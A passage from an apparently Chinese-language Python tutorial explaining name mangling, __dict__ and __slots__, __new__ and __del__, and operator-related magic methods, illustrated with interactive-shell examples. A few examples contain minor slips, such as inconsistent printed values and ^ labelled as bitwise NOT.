<h4 id="16-40-22-name-mangling-机制的实现原理"><a href="#16-40-22-name-mangling-机制的实现原理" class="headerlink" title="16.40.22 name mangling 机制的实现原理"></a>16.40.22 name mangling 机制的实现原理</h4><p>我们看看 <code>__dict__</code> 属性里面有啥：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; c.__dict__</span><br><span class="line">&#123;&#x27;_C__x&#x27;: 250&#125;</span><br></pre></td></tr></table></figure><br>虽然这里面没有看到 <code>__x</code>，但是，却多了一个 <code>_C__x</code> 的属性对不对？<br>访问一下试试：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; c._C__x</span><br><span class="line">520</span><br></pre></td></tr></table></figure><br>果然如此……这个就是传说中的名字改编术！</p>
<p>做法其实也很简单，就是下横线（_）加上类名，再加上变量的名字。<br>方法名也是同样的道理：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class D:</span><br><span class="line">...     def __func(self):</span><br><span class="line">...         print(&quot;Hello FishC.&quot;)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; d = D()</span><br><span class="line">&gt;&gt;&gt; d.__func()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#12&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    d.__func()</span><br><span class="line">AttributeError: &#x27;D&#x27; object has no attribute &#x27;__func&#x27;</span><br><span class="line">&gt;&gt;&gt; d._D__func()</span><br><span class="line">Hello FishC.</span><br></pre></td></tr></table></figure></p>
<p><strong>注意：name mangling 机制是发生在类实例化对象时候的事情，给对象动态添加属性则不会有同样的效果。</strong></p>
<h4 id="16-40-23-效率提升之道"><a href="#16-40-23-效率提升之道" class="headerlink" title="16.40.23 效率提升之道"></a>16.40.23 效率提升之道</h4><p>Python 对象存储属性的工作原理 —— 字典 <code>__dict__</code>：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class C:</span><br><span class="line">...     def __init__(self, x):</span><br><span class="line">...         self.x = x</span><br><span class="line">...                </span><br><span class="line">&gt;&gt;&gt; c = C(250)</span><br><span class="line">&gt;&gt;&gt; c.x</span><br><span class="line">250</span><br><span class="line">&gt;&gt;&gt; c.__dict__</span><br><span class="line">&#123;&#x27;x&#x27;: 250&#125;</span><br></pre></td></tr></table></figure></p>
<p>对象动态添加属性，就是将键值对添加到 <code>__dict__</code> 中：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; c.y = 520</span><br><span class="line">&gt;&gt;&gt; c.__dict__</span><br><span class="line">&#123;&#x27;x&#x27;: 250, &#x27;y&#x27;: 520&#125;</span><br></pre></td></tr></table></figure><br>甚至你可以直接通过给字典添加键值对的形式来创建对象的属性：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; c.__dict__[&#x27;z&#x27;] = 666</span><br><span class="line">&gt;&gt;&gt; c.__dict__</span><br><span class="line">&#123;&#x27;x&#x27;: 250, &#x27;y&#x27;: 520, &#x27;z&#x27;: 666&#125;</span><br><span class="line">&gt;&gt;&gt; c.z</span><br><span class="line">666</span><br></pre></td></tr></table></figure><br>但是，字典高效率的背后是以付出更多存储空间为代价的（<a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-205214-1-1.html">字典和集合高效背后的玄机</a>）</p>
<p>如果我们明确知道一个类的对象设计出来，就只是需要那么固定的某几个属性，并且不需要有动态添加属性这样的功能，那么利用字典来存放属性，这种空间上的牺牲就是纯纯地浪费！<br>针对这个情况，Python 专门设计了一个 <strong>slots</strong> 类属性，避免了利用字典存放属性造成空间上的浪费。<br>举个例子:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class C:</span><br><span class="line">...     __slots__ = [&#x27;x&#x27;, &#x27;y&#x27;]</span><br><span class="line">...     def __init__(self, x):</span><br><span class="line">...         self.x = x</span><br><span class="line">...        </span><br><span class="line">&gt;&gt;&gt; c = C(250)</span><br></pre></td></tr></table></figure><br>这样，我们就创建了一个属性受限制的对象。<br>访问 <code>__slots__</code> 中列举的属性是没问题的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; c.x</span><br><span class="line">250</span><br><span class="line">&gt;&gt;&gt; c.y = 520</span><br><span class="line">&gt;&gt;&gt; c.y</span><br><span class="line">520</span><br></pre></td></tr></table></figure><br>如果想要动态地添加一个属性，那就不好意思了：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; c.z = 100</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#27&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    c.z = 100</span><br><span class="line">AttributeError: &#x27;C&#x27; object has no attribute &#x27;z&#x27;</span><br></pre></td></tr></table></figure></p>
<p>这种限制不仅体现在动态添加属性上，如果在类的内部，想创建一个 <code>__slots__</code> 不包含的属性，也是不被允许的：<br><figure class="highlight plaintext"><figcaption><span>class D:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...     __slots__ = [&#x27;x&#x27;, &#x27;y&#x27;]</span><br><span class="line">...     def __init__(self, x, y, z):</span><br><span class="line">...         self.x = x</span><br><span class="line">...         self.y = y</span><br><span class="line">...         self.z = z</span><br><span class="line">&gt;&gt;&gt; d = D(3, 4, 5)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#8&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    d = D(3, 4, 5)</span><br><span class="line">  File &quot;&lt;pyshell#6&gt;&quot;, line 6, in __init__</span><br><span class="line">    self.z = z</span><br><span class="line">AttributeError: &#x27;D&#x27; object has no attribute &#x27;z&#x27;</span><br></pre></td></tr></table></figure><br>甚至是 <code>__dict__</code> 属性，也不存在了：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d.__dict__</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#23&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    d.__dict__</span><br><span class="line">AttributeError: &#x27;D&#x27; object has no attribute &#x27;__dict__&#x27;</span><br></pre></td></tr></table></figure><br>因为使用了 <code>__slots__</code> 属性，那么对象就会划分一个固定大小的空间来存放指定的属性，这时候 <code>__dict__</code> 属性就不需要了，空间也就节约了出来。</p>
<p>不过这里有一点是需要特别强调的，就是使用 <code>__slots__</code> 属性的副作用其实也相当明显，那就是要以牺牲 Python 动态语言的灵活性，作为前提。使用了 <code>__slots__</code> 属性，就没办法再拥有动态添加属性的功能了……这可以说是它的一个副作用，但实际上很多开发者却利用这个副作用，来限制类属性的滥用。</p>
<p>最后，还有一点需要大家知道的是，继承自父类的 <code>__slots__</code> 属性是不会在子类中生效的，Python 只关注各个具体的类中定义的 <code>__slots__</code> 属性：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class E(C):</span><br><span class="line">...     pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; e = E(250)</span><br><span class="line">&gt;&gt;&gt; e.x</span><br><span class="line">250</span><br><span class="line">&gt;&gt;&gt; e.y = 520</span><br><span class="line">&gt;&gt;&gt; e.z = 666</span><br><span class="line">&gt;&gt;&gt; e.__slots__</span><br><span class="line">[&#x27;x&#x27;, &#x27;y&#x27;]</span><br></pre></td></tr></table></figure><br>对象 e 虽然拥有 <code>__slots__</code> 属性，但它同时也拥有 <code>__dict__</code> 属性：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; e.__dict__</span><br><span class="line">&#123;&#x27;z&#x27;: 666&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="16-40-23-魔法方法"><a href="#16-40-23-魔法方法" class="headerlink" title="16.40.23 魔法方法"></a>16.40.23 魔法方法</h4><p>魔法方法就如同它的名字一样，它让 Python 拥有了超凡的魔力。在面向对象开发的过程中，魔法方法总能在你需要的时候出现，并为帮助你轻松地实现你的想法。魔法方法是 Python 内部已经实现的一系列方法的统称，前后双下划线是它们身份的象征（比如 <code>__init__()</code>）。毫不夸张地说，只有掌握了魔法方法，才能算得上是真正地学会了面向对象的 Python 开发。前面我们介绍过 <code>__init__()</code> 魔法方法，它的超能力，就是在类实例化对象的时候自动进行调用，咱们自己写的方法可以做不了这个。</p>
<h5 id="16-40-23-1-new-cls-…"><a href="#16-40-23-1-new-cls-…" class="headerlink" title="16.40.23.1 new(cls[, …])"></a>16.40.23.1 <strong>new</strong>(cls[, …])</h5><p><code>__init__()</code>是对象构建的时候调用的魔法方法，其实参与构建对象还有一个 <code>__new__()</code> 方法，它是在 <code>__init__()</code> 之前被调用的。对象的诞生流程，是先调用 <code>__new__()</code> 方法，创建一个类的实例，然后将其传递给 <code>__init__()</code> 方法进行个性化定制，这么一个流程。需要重写 <code>__new__()</code> 方法的情况极少，通常会用到它不外乎两种情况：</p>
<p>一种情况是在元类中去定制类，元类是 Python 中最难理解的概念之一，是称之为魔法方法背后的魔法方法.<br>另一种情况比较特殊，是在继承不可变数据类型的时候，如果我们想要 “从中作梗”，就可以通过重写 <code>__new__()</code> 魔法方法进行拦截：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class CapStr(str):</span><br><span class="line">...     def __new__(cls, string):</span><br><span class="line">...         string = string.upper()</span><br><span class="line">...         return super().__new__(cls, string)</span><br><span class="line">...        </span><br><span class="line">&gt;&gt;&gt; cs = CapStr(&quot;FishC&quot;)</span><br><span class="line">&gt;&gt;&gt; cs</span><br><span class="line">&#x27;FISHC&#x27;</span><br></pre></td></tr></table></figure></p>
<h5 id="16-40-23-2-del-self"><a href="#16-40-23-2-del-self" class="headerlink" title="16.40.23.2 del(self)"></a>16.40.23.2 <strong>del</strong>(self)</h5><p>相反，<strong>del</strong>() 魔法方法是在对象即将被销毁的时候所自动调用的。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class C:</span><br><span class="line">...     def __init__(self):</span><br><span class="line">...         print(&quot;我来了~&quot;)</span><br><span class="line">...     def __del__(self):</span><br><span class="line">...         print(&quot;我走了~&quot;)</span><br><span class="line">...        </span><br><span class="line">&gt;&gt;&gt; c = C()</span><br><span class="line">我来了~</span><br><span class="line">&gt;&gt;&gt; del c</span><br><span class="line">我走了~</span><br></pre></td></tr></table></figure></p>
<h5 id="16-40-23-3-对象重生之旅"><a href="#16-40-23-3-对象重生之旅" class="headerlink" title="16.40.23.3 对象重生之旅"></a>16.40.23.3 对象重生之旅</h5><p>虽然官方不建议，但他又告诉你可以实现，咱们不妨来尝试一下吧~<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class D:</span><br><span class="line">...     def __init__(self, name):</span><br><span class="line">...         self.name = name</span><br><span class="line">...     def __del__(self):</span><br><span class="line">...         global x</span><br><span class="line">...         x = self</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; d = D()</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&lt;__main__.D object at 0x0000028B34990400&gt;</span><br><span class="line">&gt;&gt;&gt; d.name</span><br><span class="line">&#x27;小甲鱼&#x27;</span><br><span class="line">&gt;&gt;&gt; del d</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#12&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    d</span><br><span class="line">NameError: name &#x27;d&#x27; is not defined</span><br><span class="line">&gt;&gt;&gt; x</span><br><span class="line">&lt;__main__.D object at 0x0000028B34990400&gt;</span><br><span class="line">&gt;&gt;&gt; x.name</span><br><span class="line">&#x27;小甲鱼&#x27;</span><br></pre></td></tr></table></figure><br>这是一种方法。但是非迫不得已，尽量不要使用全局变量，因为它会污染命名空间。</p>
<p>还有一种方法是通过闭包的形式，将这个对象给保存起来。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class E:</span><br><span class="line">...     def __init__(self, name, func):</span><br><span class="line">...         self.name = name</span><br><span class="line">...         self.func = func</span><br><span class="line">...     def __del__(self):</span><br><span class="line">...         self.func(self)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; def outer():</span><br><span class="line">...     x = 0</span><br><span class="line">...     def inner(y=None):</span><br><span class="line">...         nonlocal x</span><br><span class="line">...         if y:</span><br><span class="line">...             x = y</span><br><span class="line">...         else:</span><br><span class="line">...             return x</span><br><span class="line">...     return inner</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; f = outer()</span><br><span class="line">&gt;&gt;&gt; e = E(&quot;小甲鱼&quot;, f)</span><br><span class="line">&gt;&gt;&gt; e</span><br><span class="line">&lt;__main__.E object at 0x0000024775760790&gt;</span><br><span class="line">&gt;&gt;&gt; e.name</span><br><span class="line">&#x27;小甲鱼&#x27;</span><br><span class="line">&gt;&gt;&gt; del e</span><br><span class="line">&gt;&gt;&gt; e</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#37&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    e</span><br><span class="line">NameError: name &#x27;e&#x27; is not defined</span><br><span class="line">&gt;&gt;&gt; g = f()</span><br><span class="line">&gt;&gt;&gt; g</span><br><span class="line">&lt;__main__.E object at 0x0000024775760790&gt;</span><br><span class="line">&gt;&gt;&gt; g.name</span><br><span class="line">&#x27;小甲鱼&#x27;</span><br></pre></td></tr></table></figure></p>
<h5 id="16-40-23-4-运算相关的魔法方法"><a href="#16-40-23-4-运算相关的魔法方法" class="headerlink" title="16.40.23.4 运算相关的魔法方法"></a>16.40.23.4 运算相关的魔法方法</h5><p>涉及到的方法数量之庞大，可能会让在座各位都大吃一鲸：<br><img src="/image/运算相关的魔法方法大合集.png" alt="运算相关的魔法方法大合集.png"></p>
<p>一共有 53 个，具体明细可以参考 -&gt; <a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-214869-1-1.html">传送门</a><br>用到的时候，拿出来查一下就 OK，写过几次代码也就自然记住了。</p>
<p>涉及到运算相关的操作，Python 也都提供了相应的魔法方法。<br>比如说，我们希望两个字符串相加的结果不是拼接，而是统计两者的字符个数之和，代码可以这么写：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class S(str):</span><br><span class="line">...     def __add__(self, other):</span><br><span class="line">...         return len(self) + len(other)</span><br><span class="line">...        </span><br><span class="line">&gt;&gt;&gt; s1 = S(&quot;FishC&quot;)</span><br><span class="line">&gt;&gt;&gt; s2 = S(&quot;Python&quot;)</span><br><span class="line">&gt;&gt;&gt; s1 + s2</span><br><span class="line">11</span><br></pre></td></tr></table></figure><br>只要重写对象的 <code>__add__()</code> 魔法方法，就可以实现对加法运算的拦截。<br>s1 + s2 就相当于 <code>s1.__add__(s2)</code></p>
<h5 id="16-40-23-5-反算术运算相关的魔法方法"><a href="#16-40-23-5-反算术运算相关的魔法方法" class="headerlink" title="16.40.23.5 反算术运算相关的魔法方法"></a>16.40.23.5 反算术运算相关的魔法方法</h5><p>“r” 开头的版本（比如 <code>__radd__()</code>），即 “反算术运算” 的这部分魔法方法，它们其实都是跟上面的算术运算是一一对应的。</p>
<p>那么它们的区别是什么呢？</p>
<p>仍然是拿加法来举例好了，当两个对象相加的时候，如果左侧的对象和右侧的对象不同类型，并且左侧的对象没有定义 <code>__add__()</code> 方法，或者其 <code>__add__()</code> 返回 NotImplemented，那么 Python 就会去右侧的对象中找查找是否有 <code>__radd__()</code> 方法的定义。</p>
<p>举个栗子：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class S1(str):</span><br><span class="line">...     def __add__(self, other):</span><br><span class="line">...         return NotImplemented</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; class S2(str):</span><br><span class="line">...     def __radd__(self, other):</span><br><span class="line">...         return len(self) + len(other)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; s1 = S1(&quot;Apple&quot;)</span><br><span class="line">&gt;&gt;&gt; s2 = S2(&quot;Banana&quot;)</span><br><span class="line">&gt;&gt;&gt; s1 + s2</span><br><span class="line">12</span><br></pre></td></tr></table></figure><br>这里能够成功调用到 <code>__radd__()</code> 方法，首先当然是因为 S2 实现了 <code>__radd__()</code> 方法；其次，s1 和 s2 是两个基于不同类的对象；再有一个条件，就是 S1 必须不能实现 <code>__add__()</code> 方法，不然还是会优先去执行左侧对象的 <code>__add__()</code> 方法（这里我们 <code>__add__()</code> 方法返回 NotImplemented，含义就是明确表示这个方法未实现；如果我们在 S1 中直接不去定义 <code>__add__()</code> 方法，也可以得到相同的结果）。</p>
<h5 id="16-40-23-6-增强赋值运算相关的魔法方法"><a href="#16-40-23-6-增强赋值运算相关的魔法方法" class="headerlink" title="16.40.23.6 增强赋值运算相关的魔法方法"></a>16.40.23.6 增强赋值运算相关的魔法方法</h5><p>“i” 开头的版本（比如 <code>__iadd__()</code>），即 “增强赋值运算” 的这部分魔法方法，它们也是跟上面的算术运算也是对应的，不过呢，这个执行的是运算兼赋值的操作。<br>也就是说 <code>s1 += s2</code>，就相当于 <code>s1 = s1.__iadd(s2)</code>。</p>
<p><strong>注意，它有一个自我赋值的操作，也就是说它会修改对象自身：</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class S1(str):</span><br><span class="line">...     def __iadd__(self, other):</span><br><span class="line">...         return len(self) + len(other)</span><br><span class="line">...        </span><br><span class="line">&gt;&gt;&gt; s1 = S1(&quot;Apple&quot;)</span><br><span class="line">&gt;&gt;&gt; s1 += s2</span><br><span class="line">&gt;&gt;&gt; s1</span><br><span class="line">11</span><br><span class="line">&gt;&gt;&gt; type(s1)</span><br><span class="line">&lt;class &#x27;int&#x27;&gt;</span><br></pre></td></tr></table></figure></p>
<p>所以，用的时候一定要先想清楚，不然一个不小心，就容易把自己的对象给搞丢咯。</p>
<p>另外，如果增强赋值运算符的左侧对象没有实现相应的魔法方法，比如 += 的左侧对象没有实现  <code>__iadd__()</code> 方法，那么将退而求其次，使用相应的 <code>__add__()</code> 方法和 <code>__radd__()</code> 方法来实现：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class S2(str):</span><br><span class="line">...     def __radd__(self, other):</span><br><span class="line">...         return len(self) + len(other)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; s2 = S2(&quot;FishC&quot;)</span><br><span class="line">&gt;&gt;&gt; type(s2)</span><br><span class="line">&lt;class &#x27;__main__.S2&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; s2 += s2</span><br><span class="line">&gt;&gt;&gt; s2</span><br><span class="line">&#x27;FishCFishC&#x27;</span><br><span class="line">&gt;&gt;&gt; type(s2)</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure></p>
<h5 id="16-40-23-7-一些内置函数也有相应的魔法方法"><a href="#16-40-23-7-一些内置函数也有相应的魔法方法" class="headerlink" title="16.40.23.7 一些内置函数也有相应的魔法方法"></a>16.40.23.7 一些内置函数也有相应的魔法方法</h5><p>比如 int() 函数，它相应的魔法方法是 <code>__int__()</code>。那么 int(x) 就相当于调用了 <code>x.__int__()</code>。<br>利用这个特性，我们就可以轻松地实现一个可以将中文转换为整数的对象，来大家请看代码：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class ZH_INT:</span><br><span class="line">    def __init__(self, num):</span><br><span class="line">        self.num = num</span><br><span class="line">    </span><br><span class="line">    def __int__(self):</span><br><span class="line">        try:</span><br><span class="line">            return int(self.num)</span><br><span class="line">        except ValueError:</span><br><span class="line">            zh = &#123;&quot;零&quot;:0, &quot;一&quot;:1, &quot;二&quot;:2, &quot;三&quot;:3, &quot;四&quot;:4, &quot;五&quot;:5, &quot;六&quot;:6, &quot;七&quot;:7, &quot;八&quot;:8, &quot;九&quot;:9,</span><br><span class="line">                  &quot;壹&quot;:1, &quot;贰&quot;:2, &quot;叁&quot;:3, &quot;肆&quot;:4, &quot;伍&quot;:5, &quot;陆&quot;:6, &quot;柒&quot;:7, &quot;捌&quot;:8, &quot;玖&quot;:9, &#125;</span><br><span class="line">            result = 0</span><br><span class="line">            </span><br><span class="line">            for each in self.num:</span><br><span class="line">                if each in zh:</span><br><span class="line">                    result += zh[each]</span><br><span class="line">                else:</span><br><span class="line">                    result += int(each)</span><br><span class="line">                result *= 10</span><br><span class="line">                </span><br><span class="line">            return result // 10</span><br></pre></td></tr></table></figure><br>我们通过拦截了 <code>__int__()</code> 魔法方法，让它在原来的基础上添加了对中文数字的识别：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; n = ZH_INT(&quot;五贰零&quot;)</span><br><span class="line">&gt;&gt;&gt; int(n)</span><br><span class="line">520</span><br><span class="line">&gt;&gt;&gt; n = ZH_INT(&quot;五贰零1314&quot;)</span><br><span class="line">&gt;&gt;&gt; int(n)</span><br><span class="line">5201314</span><br></pre></td></tr></table></figure></p>
<h5 id="16-40-23-8-位运算"><a href="#16-40-23-8-位运算" class="headerlink" title="16.40.23.8 位运算"></a>16.40.23.8 位运算</h5><p>常见的位运算包含按位与（&amp;）、按位或（|）、按位非（^），还有按位异或。<br>前者是对两个整数进行位运算：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; bin(2)</span><br><span class="line">&#x27;0b10&#x27;</span><br><span class="line">&gt;&gt;&gt; bin(3)</span><br><span class="line">&#x27;0b11&#x27;</span><br><span class="line">&gt;&gt;&gt; bin(4)</span><br><span class="line">&#x27;0b100&#x27;</span><br><span class="line">&gt;&gt;&gt; 3 &amp; 2</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; 3 &amp; 4</span><br><span class="line">0</span><br></pre></td></tr></table></figure><br>这里 &amp; 是按位进行 “与” 运算，就是只有当相同的位的值均为 1 的情况下，那么结果才为 1。</p>
<p>按位或也是相同的道理：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 3 | 2</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; 3 | 4</span><br><span class="line">7</span><br></pre></td></tr></table></figure></p>
<p>按位非则是将每个位进行取反，就是将 1 变成 0，0 变成 1，这样：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ~2</span><br><span class="line">-3</span><br><span class="line">&gt;&gt;&gt; ~3</span><br><span class="line">-4</span><br><span class="line">&gt;&gt;&gt; ~4</span><br><span class="line">-5</span><br></pre></td></tr></table></figure></p>
